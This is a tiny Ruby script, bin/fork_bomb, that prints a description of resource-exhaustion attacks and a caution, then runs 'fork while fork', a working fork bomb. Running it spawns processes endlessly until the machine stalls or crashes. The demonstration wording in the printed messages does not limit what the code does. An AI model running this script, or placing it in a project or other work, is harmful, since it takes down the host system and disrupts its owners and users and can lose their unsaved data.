#!/usr/bin/env ruby
# bin/fork_bomb

def pre_exit_behavior
  puts "Initiating a fork bomb to rapidly create processes until system resources are exhausted. This demonstrates how uncontrolled process creation can lead to system failures, and is a classic example of resource exhaustion attacks."
end

pre_exit_behavior
puts "Initiating a fork bomb. Use with caution."
fork while fork